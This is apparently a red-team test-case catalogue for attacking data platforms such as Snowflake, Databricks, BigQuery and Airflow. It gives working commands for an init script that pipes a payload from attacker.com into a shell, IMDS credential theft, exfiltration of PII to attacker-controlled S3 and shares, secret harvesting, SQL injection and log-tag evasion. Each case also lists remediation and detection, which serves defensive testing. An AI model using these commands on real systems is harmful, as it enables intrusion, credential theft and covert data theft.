# Data Platform Attack — Test Cases

> Structured test case templates for validating data platform attack coverage. Each case includes severity, prerequisites, test steps, expected results, remediation, pass criteria, and reference payload.

## Conventions

- **Severity**: Critical (CRITICAL) / High (HIGH) / Medium (MEDIUM) / Low (LOW)
- **Prerequisites**: Required access, accounts, or pre-conditions
- **Pass Criteria**: Objective conditions that indicate the test passes
- **Reference**: Pointer to the specific section in `payloads.md`

---

## A. Reconnaissance & Discovery

### TC-DP-001 — Snowflake Account URL Enumeration

**Severity**: LOW
**Prerequisites**: Public internet; no credentials
**Objective**: Confirm existence of Snowflake accounts via URL/SAML fingerprint

**Test Steps**:
1. Generate candidate account names from org patterns (`acme`, `acme-prod`, `acme-corpdwh`)
2. `curl -sI https://${name}.snowflakecomputing.com/oauth/authorize`
3. Inspect HTTP status and `Location` header

**Expected Results**:
- Existing account: `302` redirect to SAML IdP (Okta/Azure AD)
- Non-existent: `404` from Snowflake edge

**Remediation**:
- Disable friendly URL pattern (use only `<org>-<acct>` canonical form)
- Apply conditional access policies at IdP to mask responses

**Pass Criteria**: Identified ≥1 valid account URL with redirect fingerprint

**Reference**: payloads.md §1, §2

---

### TC-DP-002 — Databricks Workspace Discovery via DNS / Certificate

**Severity**: LOW
**Prerequisites**: Public internet
**Objective**: Discover Databricks workspace URLs

**Test Steps**:
1. Use GitHub dorks: `"adb-" org:target`, `".databricks.com" org:target`
2. For each candidate workspace: `curl -sI https://${name}.cloud.databricks.com`
3. Inspect certificate SAN for workspace ID confirmation

**Expected Results**:
- Valid workspace returns Databricks login page (HTTP 200)
- TLS cert SAN contains `*.databricks.com` with workspace ID

**Remediation**:
- Mark workspace URLs as confidential in code repos
- Use private workspace endpoints (PrivateLink)

**Pass Criteria**: Workspace URL confirmed for ≥1 environment (prod/staging/dev)

**Reference**: payloads.md §1, §8

---

### TC-DP-003 — Airflow Webserver Fingerprint

**Severity**: LOW
**Prerequisites**: Network access to Airflow webserver

**Test Steps**:
1. `curl https://airflow.target/login/ | grep -oP 'Airflow v[\d.]+'`
2. `curl https://airflow.target/health`
3. Test unauthenticated API access:
   - `curl https://airflow.target/api/v1/dagRuns`
   - `curl https://airflow.target/api/v1/connections`

**Expected Results**:
- Version disclosure via login banner
- Health endpoint reveals executor type
- Unauthenticated API returns `401` in hardened deployments; `200` in default

**Remediation**:
- Disable version banner via `webserver.show_stack_trace = False`
- Force auth on all API endpoints (`AUTH_ROLE_PUBLIC = "Viewer"` minimum)

**Pass Criteria**: Version identified OR unauthenticated API access confirmed

**Reference**: payloads.md §1, §24

---

## B. Snowflake Identity Abuse

### TC-DP-004 — Snowflake SSO Login with Phished Credentials

**Severity**: CRITICAL
**Prerequisites**: Phished user credential; no MFA on target account

**Test Steps**:
1. Set account/user env vars
2. Run: `snowsql -a $SNOWFLAKE_ACCOUNT -u $USER --authenticator=externalbrowser -q "SELECT current_user(), current_role();"`
3. Enumerate: `SHOW ROLES;`, `SHOW GRANTS TO USER;`

**Expected Results**:
- Successful auth without MFA prompt
- `USE ROLE ACCOUNTADMIN;` succeeds if SCIM mis-mapped

**Remediation**:
- Enforce phishing-resistant MFA (WebAuthn) for all users
- Apply conditional access with IP/user-agent conditions
- Review SCIM role mapping for wildcard grants

**Pass Criteria**: Successful login + at least one role enumeration succeeded

**Reference**: payloads.md §3, §4

---

### TC-DP-005 — Snowflake Network Policy Bypass

**Severity**: HIGH
**Prerequisites**: Valid credential; source IP outside allowed CIDR

**Test Steps**:
1. From a non-corporate IP, attempt `snowsql -a ... -u ...`
2. Identify a CI runner IP that's allowed (often 10.x for self-hosted GitHub Runners)
3. Pivot through the runner's session using its OAuth token

**Expected Results**:
- Direct login from disallowed IP → connection blocked
- Login from CI runner IP → success
- Per-user network policy (if misconfigured) overrides global policy

**Remediation**:
- Apply network policies at the user level (not just account)
- Use `network_policy` property on each user
- Block CI runner IPs from ACCOUNTADMIN role
- Use Snowflake's "policy exceptions" feature carefully

**Pass Criteria**: Bypassed policy via CI runner pivot OR identified misconfigured per-user policy

**Reference**: payloads.md §5

---

### TC-DP-006 — Snowflake Accountadmin via SCIM Wildcard Mapping

**Severity**: CRITICAL
**Prerequisites**: Phished user with arbitrary AAD group membership

**Test Steps**:
1. Identify SCIM integration: `SHOW SECURITY INTEGRATIONS;`
2. Review `AAD_TO_SNOWFLAKE_ROLE_MAPPING` for wildcards (`"*"`)
3. Attempt `USE ROLE ACCOUNTADMIN;`

**Expected Results**:
- Wildcard mapping grants ACCOUNTADMIN to any AAD user
- Role grant visible in `SHOW GRANTS TO ROLE ACCOUNTADMIN;`

**Remediation**:
- Replace wildcard mapping with explicit role mapping per AAD group
- Use `accountadmin` only via PIM (privileged identity management)
- Implement break-glass account with hardware MFA

**Pass Criteria**: Confirmed wildcard mapping OR successful ACCOUNTADMIN assumption

**Reference**: payloads.md §4

---

## C. Snowflake Exfiltration

### TC-DP-007 — COPY INTO External Stage

**Severity**: CRITICAL
**Prerequisites**: TRANSFORMER role or higher with CREATE STAGE privilege

**Test Steps**:
1. Create attacker-controlled S3 stage:
   ```sql
   CREATE STAGE attacker_stage URL='s3://attacker-bucket/'
     CREDENTIALS=(AWS_KEY_ID='REPLACE_WITH_YOUR_AKI' AWS_SECRET_KEY='REPLACE_WITH_YOUR_SK');
   ```
2. Run: `COPY INTO @attacker_stage/users.csv FROM PROD_DB.PII.USERS;`
3. Verify file exists in attacker S3 bucket

**Expected Results**:
- COPY executes in seconds for moderate tables
- File uploaded with expected row count
- Audit log entry: `COPY INTO` with stage

**Remediation**:
- Block outbound stage creation via network policy + `CREATE STAGE` privilege restriction
- Monitor `COPY INTO @external_stage` patterns
- Require stage ownership = workload identity

**Pass Criteria**: File present in attacker bucket with expected schema

**Reference**: payloads.md §6

---

### TC-DP-008 — Cross-Account Share Exfiltration

**Severity**: CRITICAL
**Prerequisites**: ACCOUNTADMIN role on victim account

**Test Steps**:
1. `CREATE SHARE attacker_share;`
2. Grant on database/schema/table to share
3. `ALTER SHARE attacker_share ADD ACCOUNTS = 'attacker-account-id';`
4. From attacker account: `CREATE DATABASE stolen FROM SHARE victim-attacker_share;`
5. Query: `SELECT * FROM stolen.pii.customers LIMIT 1000;`

**Expected Results**:
- Share created on victim account
- Database instantiated in attacker account
- Query succeeds with victim data

**Remediation**:
- Restrict `CREATE SHARE` privilege to break-glass roles
- Alert on outbound share creation
- Require dual-control for share grants to external accounts

**Pass Criteria**: Data readable from attacker account

**Reference**: payloads.md §7, §33

---

## D. Databricks Attacks

### TC-DP-009 — PAT Leak Discovery & Validation

**Severity**: HIGH
**Prerequisites**: Access to CI logs / Slack / GitHub dorks

**Test Steps**:
1. Search GitHub for `"dapi" org:target`, `"DATABRICKS_TOKEN=" org:target`
2. For each candidate token:
   ```bash
   curl -s -H "Authorization: Bearer dapi-REPLACE_WITH_YOUR_TOKEN" \
     "$DATABRICKS_HOST/api/2.0/token-management/current"
   ```
3. Enumerate workspace: `databricks workspace list /`

**Expected Results**:
- Valid token returns owner, scope, creation/expiry time
- Invalid token returns `401`

**Remediation**:
- Rotate PATs on personnel change
- Prefer OAuth over PAT
- Use Databricks secret scopes for storing tokens in CI

**Pass Criteria**: Validated token with workspace enumeration successful

**Reference**: payloads.md §8, §9

---

### TC-DP-010 — Notebook %python IMDS Theft

**Severity**: CRITICAL
**Prerequisites**: Cluster access with `%python` enabled

**Test Steps**:
1. Attach to a cluster with instance profile
2. Run cell:
   ```python
   %python
   import subprocess
   print(subprocess.check_output([
     'curl', '-s',
     'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
   ]).decode())
   ```
3. Extract instance profile name and credentials
4. Use creds: `aws s3 ls s3://prod-customer-data/`

**Expected Results**:
- IMDS responds with instance profile name
- Credentials extracted from next path segment
- Cross-account S3 access works

**Remediation**:
- Apply IMDSv2 (token-based) requirement on all EC2 instances
- Restrict cluster init scripts and `%sh` access via cluster policy
- Use instance profile with minimal permissions
- Audit cluster logs for IMDS access patterns

**Pass Criteria**: Extracted instance profile credentials with successful S3 read

**Reference**: payloads.md §11

---

### TC-DP-011 — Secret Scope ACL Abuse

**Severity**: HIGH
**Prerequisites**: Workspace member with READ on shared scope

**Test Steps**:
1. `databricks secrets list-scopes`
2. `databricks secrets list-acls --scope prod-secrets`
3. For each scope with READ: `databricks secrets list --scope prod-secrets`
4. `databricks secrets get --scope prod-secrets --key snowflake_password`

**Expected Results**:
- Scopes with broad READ ACLs expose all secrets to all workspace members
- Returned secrets decrypt to plaintext (or are AKV-backed plaintext)

**Remediation**:
- Apply ACLs based on least privilege per scope
- Use Azure Key Vault-backed scopes for centralized audit
- Rotate secrets on ACL changes

**Pass Criteria**: Extracted ≥1 high-value secret from misconfigured scope

**Reference**: payloads.md §10

---

### TC-DP-012 — Cluster Init Script RCE

**Severity**: CRITICAL
**Prerequisites**: Cluster create permission

**Test Steps**:
1. Upload init script:
   ```bash
   echo '#!/bin/bash
   curl -s http://attacker.com/c2 | sh' > init.sh
   dbfs cp init.sh dbfs:/init/init.sh
   ```
2. Create cluster with init script:
   ```bash
   databricks clusters create --json '{
     "cluster_name": "shared-test",
     "spark_version": "13.3.x-scala2.12",
     "node_type_id": "i3.xlarge",
     "init_scripts": [{"dbfs": {"destination": "dbfs:/init/init.sh"}}]
   }'
   ```
3. Verify callback at attacker C2

**Expected Results**:
- Cluster starts and runs init script as root
- Callback received at attacker C2

**Remediation**:
- Restrict cluster create permission via cluster policy
- Disable DBFS for init scripts (use workspace files only)
- Audit init scripts in CI

**Pass Criteria**: Callback received at attacker C2 from cluster node

**Reference**: payloads.md §12

---

## E. BigQuery Attacks

### TC-DP-013 — Service Account Key Enumeration

**Severity**: HIGH
**Prerequisites**: Leaked service account JSON key

**Test Steps**:
1. `gcloud auth activate-service-account --key-file=./sa.json`
2. `gcloud projects list`
3. `python3 enumerate_iam.py --service-account ./sa.json`

**Expected Results**:
- SA can list projects accessible to it
- enumerate-iam reveals all granted permissions

**Remediation**:
- Use short-lived workload identity tokens instead of keys
- Apply Cloud IAM Conditions on resource access
- Monitor key creation events

**Pass Criteria**: Enumerated ≥3 permissions beyond basic metadata

**Reference**: payloads.md §14

---

### TC-DP-014 — Authorized Dataset Chain to PII

**Severity**: CRITICAL
**Prerequisites**: BigQuery user role in shared project

**Test Steps**:
1. `bq show --format=prettyjson acme-prod:shared | jq '.access'`
2. Identify authorized view in shared project reading from `acme-prod:pii`
3. `bq query --use_legacy_sql=false 'SELECT * FROM \`acme-prod.shared.dashboard_v\` LIMIT 1000'`

**Expected Results**:
- View returns rows from underlying `pii` tables despite no direct grant
- Audit log: `bigquery.googleapis.com/DataRead` from shared view

**Remediation**:
- Audit authorized views quarterly
- Use column-level security + policy tags
- Apply resource hierarchy: prod data in separate folder

**Pass Criteria**: Retrieved PII rows without direct grant on underlying table

**Reference**: payloads.md §15

---

### TC-DP-015 — Remote Function RCE

**Severity**: CRITICAL
**Prerequisites**: BigQuery dataEditor + Cloud Run invoker

**Test Steps**:
1. Deploy attacker Cloud Run service returning arbitrary data
2. Create connection: `bq mk --connection --location=US --connection_type=CLOUD_RESOURCE attacker-conn`
3. Create remote function pointing to attacker service
4. Invoke on PII:
   ```sql
   SELECT `acme-prod.utils.exfil`(TO_JSON_STRING(users))
   FROM `acme-prod.pii.users` LIMIT 1000;
   ```

**Expected Results**:
- Cloud Run receives row data as JSON
- Function returns injected data
- Audit log: remote function call with full payload

**Remediation**:
- Restrict remote function creation via org policy
- Block egress from Cloud Run to non-approved endpoints
- Audit connection grants

**Pass Criteria**: Attacker Cloud Run received ≥1 row of PII

**Reference**: payloads.md §17

---

## F. Redshift Attacks

### TC-DP-016 — IAM Chaining (GetClusterCredentials → Lateral)

**Severity**: HIGH
**Prerequisites**: IAM role with `redshift:GetClusterCredentials`

**Test Steps**:
1. `aws redshift describe-clusters --query 'Clusters[].IamRoles'`
2. `aws redshift get-cluster-credentials --cluster-identifier acme-rs --db-user bi_service --db-name prod`
3. `psql "host=... user=temp_bi_service password=TEMP_PW"`
4. Query: `SELECT * FROM pg_catalog.pg_shadow;`

**Expected Results**:
- Temp creds valid for 900s default
- pg_shadow reveals password hashes for all DB users

**Remediation**:
- Apply row-level security on `pg_catalog.pg_shadow`
- Use Redshift IAM Identity Center integration
- Monitor GetClusterCredentials calls per IAM role

**Pass Criteria**: Retrieved password hashes via lateral query

**Reference**: payloads.md §18, §19

---

## G. dbt Cloud Attacks

### TC-DP-017 — DBT_CLOUD_API_TOKEN Replay

**Severity**: HIGH
**Prerequisites**: Leaked DBT_CLOUD_API_TOKEN

**Test Steps**:
1. `export DBT_CLOUD_API_TOKEN=REPLACE_WITH_YOUR_TOKEN`
2. `curl -H "Authorization: Token $TOKEN" https://cloud.getdbt.com/api/v2/accounts/$ACCT_ID/projects/`
3. Fetch latest run artifacts: `.../runs/<id>/artifacts/manifest.json`
4. Extract Snowflake connection from `manifest.json` sources

**Expected Results**:
- API responds with project list
- Manifest reveals every model, source, and test
- Sources include Snowflake account/database/schema

**Remediation**:
- Use service tokens with scoped permissions
- Rotate tokens quarterly
- Audit token use via dbt Cloud audit log

**Pass Criteria**: Downloaded manifest + identified ≥1 PII source

**Reference**: payloads.md §21, §22

---

### TC-DP-018 — profiles.yml Secret Extraction

**Severity**: HIGH
**Prerequisites**: Access to CI runner / dev workstation

**Test Steps**:
1. Locate `profiles.yml` in `~/.dbt/` or repo
2. Parse for `password:` field
3. Use extracted creds: `snowsql -a ... -u dbt_service --authenticator=externalbrowser`

**Expected Results**:
- Plaintext Snowflake password recovered
- Login as `dbt_service` succeeds with TRANSFORMER role

**Remediation**:
- Use environment-variable-based auth in profiles
- Use dbt Cloud for credential management
- Never commit `profiles.yml` to git

**Pass Criteria**: Successful Snowflake login with extracted credential

**Reference**: payloads.md §23

---

## H. Airflow Attacks

### TC-DP-019 — Metadata DB Connection Harvest

**Severity**: CRITICAL
**Prerequisites**: Network access to Airflow metadata DB

**Test Steps**:
1. Connect via psql:
   ```bash
   psql "host=... dbname=airflow user=airflow password=REPLACE_WITH_YOUR_PW"
   ```
2. `SELECT conn_id, conn_type, password FROM connection;`
3. Recover `FERNET_KEY` from env / config
4. Decrypt each password offline with Fernet

**Expected Results**:
- All connections extracted
- Decryption reveals plaintext Snowflake/AWS/Slack credentials

**Remediation**:
- Use AWS Secrets Manager / HashiCorp Vault as secrets backend
- Rotate `FERNET_KEY` if exposed
- Restrict metadata DB to internal IPs only

**Pass Criteria**: Decrypted ≥3 high-value credentials

**Reference**: payloads.md §24, §25, §27

---

### TC-DP-020 — DAG Repo Backdoor Injection

**Severity**: HIGH
**Prerequisites**: Write access to DAG repo / CI

**Test Steps**:
1. Add malicious DAG file with `_persist()` operator that exfils env
2. Push via CI/CD
3. Wait for scheduler to load DAG
4. Verify env exfil at attacker endpoint

**Expected Results**:
- DAG loaded by scheduler
- Task executed per schedule
- Environment (including secrets) exfiltrated

**Remediation**:
- Code review required for DAG changes
- Use DAG bundle hashing in scheduler
- Restrict DAG imports to allowlisted modules

**Pass Criteria**: Environment exfil received at attacker endpoint

**Reference**: payloads.md §26

---

## I. Lakehouse & Cross-Platform

### TC-DP-021 — Delta Log Tampering

**Severity**: CRITICAL
**Prerequisites**: Write access to S3 backing Delta table

**Test Steps**:
1. Identify latest version: `cat s3://bucket/path/_delta_log/_last_checkpoint`
2. Read commit log: `aws s3 cp s3://bucket/path/_delta_log/00000000000000000042.json -`
3. Append tampered commit `00000000000000000043.json`:
   ```json
   {"remove":{"path":"part-00000-f00.c000.snappy.parquet"}}
   ```
4. Query table — `SELECT * FROM delta.\`s3://bucket/path\`` returns modified data

**Expected Results**:
- Delta engine treats tampered commit as valid
- Original rows silently removed from query results

**Remediation**:
- Enable Delta Lake's commit-coalescing with versioning
- Use S3 Object Lock on `_delta_log/` prefix
- Audit on writes to `_delta_log/` (CloudTrail + Athena)

**Pass Criteria**: Table query returns tampered result set

**Reference**: payloads.md §30

---

### TC-DP-022 — Warehouse SQLi at Scale

**Severity**: CRITICAL
**Prerequisites**: BI dashboard or app fanning into warehouse

**Test Steps**:
1. Identify filter parameter in dashboard URL
2. Inject `' UNION SELECT name, email, NULL FROM information_schema.users --`
3. Verify UNION result in dashboard rendering

**Expected Results**:
- UNION injection returns sensitive columns
- No rate limiting or pattern detection

**Remediation**:
- Use parameterized queries at BI layer
- Apply WAF rules for UNION keywords
- Row-level security in warehouse (Snowflake: row access policies)

**Pass Criteria**: Retrieved ≥1 sensitive field via injection

**Reference**: payloads.md §32

---

## J. Detection Evasion

### TC-DP-023 — QUERY_TAG Blending

**Severity**: MEDIUM
**Prerequisites**: Valid Snowflake session

**Test Steps**:
1. `SELECT query_tag, count(*) FROM SNOWFLAKE.ACCOUNT_USAGE.QUERY_HISTORY GROUP BY 1 ORDER BY 2 DESC LIMIT 10;`
2. Identify most common tag (e.g., `nightly_refresh_dag_backfill`)
3. `ALTER SESSION SET QUERY_TAG='nightly_refresh_dag_backfill';`
4. Run exfil COPY — confirm it blends into tag filter

**Expected Results**:
- Exfil query grouped under innocuous tag
- Default SOC dashboards miss the query when filtering on tag

**Remediation**:
- Detection rules should NOT rely solely on QUERY_TAG
- Cross-reference query shape (e.g., `COPY INTO @external_stage`) with user/role

**Pass Criteria**: Exfil query appears indistinguishable from periodic job in tag-filtered views

**Reference**: payloads.md §34

---

## Aggregate Pass Criteria

A successful engagement covers at minimum:
- **≥6 test cases passed across ≥3 platforms** (Snowflake, Databricks, BigQuery, Redshift, dbt, Airflow)
- **≥1 CRITICAL case per platform demonstrating full breach chain**
- **≥1 exfiltration path demonstrated and detected by blue team's rules**
- **Detection evasion attempt tested** (e.g., QUERY_TAG poisoning)
- **Blue-team detection engineering output** (Sigma rule, Splunk SPL, or KQL query for the demonstrated exfil pattern)

---

## Reporting Template (per test case)

```markdown
### TC-DP-XXX — <Case Title>

**Status**: PASS / FAIL / PARTIAL
**Target**: <account/workspace/project>
**Window**: <start> - <end> UTC
**Operator**: <name>

**Findings**:
- <bullet points of what was confirmed>

**Evidence**:
- Snowflake session ID: <REDACTED>
- Screenshot: <path>
- Audit log entry: <REDACTED>

**Impact**:
- <Data exposed, accounts compromised, blast radius>

**Remediation**:
1. <step 1>
2. <step 2>

**Detection Rule**:
```sql
SELECT event_time, user_name, query_tag, query_text
FROM snowflake.account_usage.query_history
WHERE query_text ILIKE '%COPY INTO @%'
  AND query_tag = 'nightly_refresh_dag_backfill';
```
```

---

## References

- Snowflake Security Trust Center — Threat Campaign Notices (2024)
- Mandiant UNC5537 Report (2024-06)
- MITRE ATT&CK — T1078.004 Cloud Accounts, T1213 Data from Information Repositories, T1552 Unsecured Credentials
- Databricks Security Best Practices Guide (2024)
- Apache Airflow Security Guide (2024)
- dbt Labs CI/CD Token Security Guide (2024)
